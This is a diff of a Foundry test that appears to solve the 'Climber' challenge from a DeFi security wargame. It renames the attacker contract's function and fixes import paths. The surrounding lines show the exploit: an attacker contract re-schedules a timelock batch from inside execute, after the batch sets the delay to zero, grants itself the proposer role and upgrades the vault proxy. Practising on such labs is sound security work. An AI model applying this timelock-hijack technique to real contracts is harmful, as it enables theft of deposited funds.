@@ -3,11 +3,11 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {ClimberVault} from "../../src/climber/ClimberVault.sol";
-import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
+import {ClimberVault} from "../src/climber/ClimberVault.sol";
+import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {ClimberVault2} from "../../src/climber/ClimberVault2.sol";
+import {DamnValuableToken} from "../src/climber/DamnValuableToken.sol";
+import {ClimberVault2} from "../src/climber/ClimberVault2.sol";
 
 contract ClimberAttacker {
     ClimberTimelock public timelock;
@@ -20,12 +20,10 @@ contract ClimberAttacker {
         timelock = _timelock;
     }
 
-    function attack() external {
-        // Здесь мы вызываем schedule с теми же параметрами, что получили в execute
+    function callSchedule() external {
         timelock.schedule(targets, values, dataElements, salt);
     }
 
-    // Функция для установки параметров
     function setParams(address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements, bytes32 _salt)
         external
     {
@@ -131,7 +129,7 @@ contract ClimberChallenge is Test {
         bytes[] memory dataElements = new bytes[](4);
         dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
         dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(attacker));
-        dataElements[2] = abi.encodeWithSignature("attack()");
+        dataElements[2] = abi.encodeWithSignature("callSchedule()");
         dataElements[3] =
             abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(newImplementation), initData);
 
